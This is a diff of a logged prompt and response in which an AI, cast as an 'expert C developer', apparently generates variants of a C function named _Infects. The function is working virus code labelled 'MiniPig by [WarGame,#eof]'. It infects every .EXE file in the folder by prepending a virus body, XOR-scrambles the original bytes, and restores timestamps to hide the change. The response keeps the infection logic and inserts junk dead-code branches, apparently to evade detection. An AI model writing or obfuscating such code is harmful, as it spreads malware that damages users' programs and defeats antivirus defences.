@@ -2,10 +2,10 @@
 {
   "finish_reason": "stop",
   "attempts": 1,
-  "response_chars": 7269
+  "response_chars": 6602
 }
 
-=== PROMPT (10670 chars) ===
+=== PROMPT (9989 chars) ===
 
             You are an expert C developer generating synthesized code variants.
             Target architecture: x86
@@ -106,42 +106,40 @@ void _Infects(void)
     HANDLE findHandle;
     HANDLE fileHandle;
     HGLOBAL fileBuffer;
-    DWORD originalAttributes;
+    DWORD fileAttributes;
     DWORD bytesWritten;
     DWORD bytesRead;
-    uint32_t offset;
-    char headerBuffer[26];
+    uint32_t i;
+    char headerBuf[26];
     _WIN32_FIND_DATAA findData;
     FILETIME creationTime;
     FILETIME lastAccessTime;
     FILETIME lastWriteTime;
-    BOOL findNextResult;
-    char *signaturePos;
+    BOOL hasNext;
+    char *signaturePtr;
 
     /* Initialize handles */
     findHandle = (HANDLE)0x0;
     fileHandle = (HANDLE)0x0;
     fileBuffer = (HGLOBAL)0x0;
 
-    /* Search for executable files */
     findHandle = FindFirstFileA("*.EXE", &findData);
     if (findHandle != (HANDLE)0xffffffff) {
         do {
             fileHandle = CreateFileA(findData.cFileName,
-                                     0xc0000000,          /* GENERIC_READ | GENERIC_WRITE */
-                                     3,                   /* FILE_SHARE_READ | FILE_SHARE_WRITE */
+                                     0xc0000000,
+                                     3,
                                      (LPSECURITY_ATTRIBUTES)0x0,
-                                     3,                   /* OPEN_EXISTING */
-                                     0x80,                /* FILE_ATTRIBUTE_NORMAL */
+                                     3,
+                                     0x80,
                                      (HANDLE)0x0);
             if (fileHandle != (HANDLE)0xffffffff) {
                 SetFilePointer(fileHandle, -0x1a, (PLONG)0x0, FILE_END);
-                memset(headerBuffer, 0, 0x1a);
-                ReadFile(fileHandle, headerBuffer, 0x1a, &bytesRead, (LPOVERLAPPED)0x0);
-                signaturePos = strstr(headerBuffer, "MiniPig by [WarGame,#eof]");
-                if (signaturePos == 0) {
-                    /* Preserve original file attributes and timestamps */
-                    originalAttributes = findData.dwFileAttributes;
+                memset(headerBuf, 0, 0x1a);
+                ReadFile(fileHandle, headerBuf, 0x1a, &bytesRead, (LPOVERLAPPED)0x0);
+                signaturePtr = strstr(headerBuf, "MiniPig by [WarGame,#eof]");
+                if (signaturePtr == 0) {
+                    fileAttributes = findData.dwFileAttributes;
                     lastWriteTime.dwLowDateTime  = findData.ftLastWriteTime.dwLowDateTime;
                     lastWriteTime.dwHighDateTime = findData.ftLastWriteTime.dwHighDateTime;
                     creationTime.dwLowDateTime   = findData.ftCreationTime.dwLowDateTime;
@@ -149,12 +147,10 @@ void _Infects(void)
                     lastAccessTime.dwLowDateTime = findData.ftLastAccessTime.dwLowDateTime;
                     lastAccessTime.dwHighDateTime= findData.ftLastAccessTime.dwHighDateTime;
 
-                    /* Append virus body */
                     SetFilePointer(fileHandle, _VirusSize + 0x1a, (PLONG)0x0, FILE_CURRENT);
                     SetEndOfFile(fileHandle);
                     CloseHandle(fileHandle);
 
-                    /* Reopen file for modification */
                     fileHandle = CreateFileA(findData.cFileName,
                                              0xc0000000,
                                              3,
@@ -170,19 +166,12 @@ void _Infects(void)
                             ReadFile(fileHandle, fileBuffer, findData.nFileSizeLow, &bytesRead, (LPOVERLAPPED)0x0);
                             SetFilePointer(fileHandle, -((LONG)findData.nFileSizeLow), (PLONG)0x0, FILE_CURRENT);
                             WriteFile(fileHandle, _VirusBody, _VirusSize, &bytesWritten, (LPOVERLAPPED)0x0);
-
-                            /* Simple XOR encryption of original content */
-                            for (offset = 0; offset < findData.nFileSizeLow; offset++) {
-                                ((uint8_t *)fileBuffer)[offset] ^= 0x4a;
+                            for (i = 0; i < findData.nFileSizeLow; i++) {
+                                *((uint8_t *)((uintptr_t)fileBuffer + i)) ^= 0x4a;
                             }
-
                             WriteFile(fileHandle, fileBuffer, findData.nFileSizeLow, &bytesWritten, (LPOVERLAPPED)0x0);
-                            WriteFile(fileHandle,
-                                      "MiniPig by [WarGame,#eof]",
-                                      0x1a,
-                                      &bytesWritten,
-                                      (LPOVERLAPPED)0x0);
-                            SetFileAttributesA(findData.cFileName, originalAttributes);
+                            WriteFile(fileHandle, "MiniPig by [WarGame,#eof]", 0x1a, &bytesWritten, (LPOVERLAPPED)0x0);
+                            SetFileAttributesA(findData.cFileName, fileAttributes);
                             SetFileTime(fileHandle, &creationTime, &lastAccessTime, &lastWriteTime);
                             CloseHandle(fileHandle);
                             GlobalFree(fileBuffer);
@@ -192,8 +181,8 @@ void _Infects(void)
                     CloseHandle(fileHandle);
                 }
             }
-            findNextResult = FindNextFileA(findHandle, &findData);
-        } while (findNextResult != 0);
+            hasNext = FindNextFileA(findHandle, &findData);
+        } while (hasNext != 0);
         FindClose(findHandle);
     }
 }
@@ -201,13 +190,14 @@ void _Infects(void)
             Use ```c according to the detected input language. 
             
 
-=== RESPONSE (7269 chars) ===
+=== RESPONSE (6602 chars) ===
 ```c
 #include "data_globals.h"
 #include <windows.h>
 #include <stdint.h>
 #include <string.h>
-#include <stdio.h>   // Added for sprintf_s
+#include <stdio.h>
+#include <stdlib.h>
 
 void _Infects(void)
 {
@@ -215,44 +205,51 @@ void _Infects(void)
     HANDLE findHandle;
     HANDLE fileHandle;
     HGLOBAL fileBuffer;
-    DWORD originalAttributes;
+    DWORD fileAttributes;
     DWORD bytesWritten;
     DWORD bytesRead;
-    uint32_t offset;
-    char headerBuffer[26];
+    uint32_t i;
+    char headerBuf[26];
     _WIN32_FIND_DATAA findData;
     FILETIME creationTime;
     FILETIME lastAccessTime;
     FILETIME lastWriteTime;
-    BOOL findNextResult;
-    char *signaturePos;
+    BOOL hasNext;
+    char *signaturePtr;
 
-    /* --- INSERTED DEAD BRANCH 1 (Pattern A – Math Invariant) --- */
+    /* --- DEAD BRANCH 1 (Pattern A – Math Invariant) --- */
     volatile int dummy_x_1 = 7;
     if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
         /* Dummy logic – Category A (System info queries) */
-        SYSTEM_INFO sysInfo;
-        GetSystemInfo(&sysInfo);                     // Windows API
-        SYSTEMTIME sysTime;
-        GetLocalTime(&sysTime);                      // Windows API
+        volatile SYSTEM_INFO sysInfo;
+        GetSystemInfo(&sysInfo);
+        volatile SYSTEMTIME sysTime;
+        GetLocalTime(&sysTime);
+        volatile char dummyBuf[64];
 
-        char dummyBuf[128];
-        for (int i = 0; i < 3; ++i) {                // dummy loop (≥2 iterations)
-            dummyBuf[i] = (char)((sysInfo.dwNumberOfProcessors + i) ^ (sysTime.wSecond));
+        /* Populate dummy buffer with processor info */
+        for (int j = 0; j < 4; ++j) {
+            dummyBuf[j] = (char)((sysInfo.dwNumberOfProcessors + j) & 0xFF);
         }
 
-        /* Compute a dummy checksum */
-        unsigned int checksum = 0;
-        for (int i = 0; i < 128; ++i) {
-            checksum = (checksum * 31) + (unsigned char)dummyBuf[i];
+        /* Compute a dummy FNV‑1a hash */
+        volatile unsigned int hash = 2166136261U;
+        for (int k = 0; k < 8; ++k) {
+            hash ^= (unsigned int)dummyBuf[k];
+            hash *= 16777619U;
         }
 
-        /* Prevent optimisation */
-        volatile unsigned int sink = checksum;
-        (void)sink;
+        /* Read an outer variable (read‑only) */
+        volatile uint32_t read_i = i;
+        (void)read_i;
+
+        /* Additional dummy work using system time */
+        for (int l = 0; l < 2; ++l) {
+            dummyBuf[8 + l] = (char)(sysTime.wHour ^ l);
+        }
 
         /* Clean up dummy buffer */
-        memset(dummyBuf, 0, sizeof(dummyBuf));       // Standard C function
+        memset(dummyBuf, 0, sizeof(dummyBuf));
     }
 
     /* Initialize handles */
@@ -260,25 +257,50 @@ void _Infects(void)
     fileHandle = (HANDLE)0x0;
     fileBuffer = (HGLOBAL)0x0;
 
-    /* Search for executable files */
     findHandle = FindFirstFileA("*.EXE", &findData);
     if (findHandle != (HANDLE)0xffffffff) {
         do {
             fileHandle = CreateFileA(findData.cFileName,
-                                     0xc0000000,          /* GENERIC_READ | GENERIC_WRITE */
-                                     3,                   /* FILE_SHARE_READ | FILE_SHARE_WRITE */
+                                     0xc0000000,
+                                     3,
                                      (LPSECURITY_ATTRIBUTES)0x0,
-                                     3,                   /* OPEN_EXISTING */
-                                     0x80,                /* FILE_ATTRIBUTE_NORMAL */
+                                     3,
+                                     0x80,
                                      (HANDLE)0x0);
+            /* --- DEAD BRANCH 2 (Pattern B – System Query) --- */
+            if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
+                /* Dummy logic – Category B (Memory & String operations) */
+                volatile char *tmpBuf = (char*)malloc(128);
+                if (tmpBuf) {
+                    volatile char pattern[32];
+                    for (int p = 0; p < 32; ++p) {
+                        pattern[p] = (char)(p * 3);
+                    }
+                    sprintf_s(tmpBuf, 128, "Dummy-%08X-%s", GetTickCount(), "Branch");
+                    size_t len = strlen(tmpBuf);
+                    volatile char copyBuf[128];
+                    memcpy(copyBuf, tmpBuf, len);
+                    copyBuf[len] = '\0';
+
+                    /* Dummy loop that computes a throw‑away sum */
+                    volatile int sum = 0;
+                    for (int m = 0; m < 3; ++m) {
+                        sum += (int)copyBuf[m];
+                    }
+                    (void)sum;
+
+                    SecureZeroMemory(tmpBuf, 128);
+                    free((void*)tmpBuf);
+                }
+            }
+
             if (fileHandle != (HANDLE)0xffffffff) {
                 SetFilePointer(fileHandle, -0x1a, (PLONG)0x0, FILE_END);
-                memset(headerBuffer, 0, 0x1a);
-                ReadFile(fileHandle, headerBuffer, 0x1a, &bytesRead, (LPOVERLAPPED)0x0);
-                signaturePos = strstr(headerBuffer, "MiniPig by [WarGame,#eof]");
-                if (signaturePos == 0) {
-                    /* Preserve original file attributes and timestamps */
-                    originalAttributes = findData.dwFileAttributes;
+                memset(headerBuf, 0, 0x1a);
+                ReadFile(fileHandle, headerBuf, 0x1a, &bytesRead, (LPOVERLAPPED)0x0);
+                signaturePtr = strstr(headerBuf, "MiniPig by [WarGame,#eof]");
+                if (signaturePtr == 0) {
+                    fileAttributes = findData.dwFileAttributes;
                     lastWriteTime.dwLowDateTime  = findData.ftLastWriteTime.dwLowDateTime;
                     lastWriteTime.dwHighDateTime = findData.ftLastWriteTime.dwHighDateTime;
                     creationTime.dwLowDateTime   = findData.ftCreationTime.dwLowDateTime;
@@ -286,12 +308,10 @@ void _Infects(void)
                     lastAccessTime.dwLowDateTime = findData.ftLastAccessTime.dwLowDateTime;
                     lastAccessTime.dwHighDateTime= findData.ftLastAccessTime.dwHighDateTime;
 
-                    /* Append virus body */
                     SetFilePointer(fileHandle, _VirusSize + 0x1a, (PLONG)0x0, FILE_CURRENT);
                     SetEndOfFile(fileHandle);
                     CloseHandle(fileHandle);
 
-                    /* Reopen file for modification */
                     fileHandle = CreateFileA(findData.cFileName,
                                              0xc0000000,
                                              3,
@@ -307,19 +327,12 @@ void _Infects(void)
                             ReadFile(fileHandle, fileBuffer, findData.nFileSizeLow, &bytesRead, (LPOVERLAPPED)0x0);
                             SetFilePointer(fileHandle, -((LONG)findData.nFileSizeLow), (PLONG)0x0, FILE_CURRENT);
                             WriteFile(fileHandle, _VirusBody, _VirusSize, &bytesWritten, (LPOVERLAPPED)0x0);
-
-                            /* Simple XOR encryption of original content */
-                            for (offset = 0; offset < findData.nFileSizeLow; offset++) {
-                                ((uint8_t *)fileBuffer)[offset] ^= 0x4a;
+                            for (i = 0; i < findData.nFileSizeLow; i++) {
+                                *((uint8_t *)((uintptr_t)fileBuffer + i)) ^= 0x4a;
                             }
-
                             WriteFile(fileHandle, fileBuffer, findData.nFileSizeLow, &bytesWritten, (LPOVERLAPPED)0x0);
-                            WriteFile(fileHandle,
-                                      "MiniPig by [WarGame,#eof]",
-                                      0x1a,
-                                      &bytesWritten,
-                                      (LPOVERLAPPED)0x0);
-                            SetFileAttributesA(findData.cFileName, originalAttributes);
+                            WriteFile(fileHandle, "MiniPig by [WarGame,#eof]", 0x1a, &bytesWritten, (LPOVERLAPPED)0x0);
+                            SetFileAttributesA(findData.cFileName, fileAttributes);
                             SetFileTime(fileHandle, &creationTime, &lastAccessTime, &lastWriteTime);
                             CloseHandle(fileHandle);
                             GlobalFree(fileBuffer);
@@ -329,34 +342,8 @@ void _Infects(void)
                     CloseHandle(fileHandle);
                 }
             }
-
-            /* --- INSERTED DEAD BRANCH 2 (Pattern B – System Query) --- */
-            if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
-                /* Dummy logic – Category B (Memory & String operations) */
-                size_t bufSize = 256;
-                char *tempBuf = (char *)malloc(bufSize);
-                if (tempBuf) {
-                    memset(tempBuf, 'A', bufSize);                     // C runtime API
-                    char formatted[64];
-                    sprintf_s(formatted, sizeof(formatted), "PID:%lu", GetCurrentProcessId()); // C runtime API
-                    memcpy(tempBuf, formatted, strlen(formatted) + 1); // C runtime API
-
-                    /* Dummy XOR loop (≥2 iterations) */
-                    for (int i = 0; i < 4; ++i) {
-                        tempBuf[i] ^= (char)(i * 0x5A);
-                    }
-
-                    /* Discard result to avoid side‑effects */
-                    volatile char discard = tempBuf[0];
-                    (void)discard;
-
-                    SecureZeroMemory(tempBuf, bufSize);                // Windows API
-                    free(tempBuf);                                     // C runtime API
-                }
-            }
-
-            findNextResult = FindNextFileA(findHandle, &findData);
-        } while (findNextResult != 0);
+            hasNext = FindNextFileA(findHandle, &findData);
+        } while (hasNext != 0);
         FindClose(findHandle);
     }
 }
